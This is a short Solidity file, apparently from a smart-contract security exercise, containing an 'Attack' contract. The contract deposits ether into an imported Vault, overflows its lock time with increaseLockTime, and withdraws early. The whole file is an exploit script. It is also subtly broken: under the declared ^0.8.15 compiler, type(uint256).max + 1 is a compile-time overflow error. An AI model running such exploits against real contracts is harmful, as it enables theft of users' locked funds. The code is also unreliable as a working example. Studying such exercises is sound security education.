// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.15;

import "./Vault.sol";

contract Attack {
    Vault v;

    fallback() external payable {}

    receive() external payable {}

    constructor(address contractAddress) {
        v = Vault(contractAddress);
    }

    function attack() public payable {
        v.deposit{value: msg.value}();
        v.increaseLockTime(type(uint256).max + 1);
        v.withdraw();
    }
}
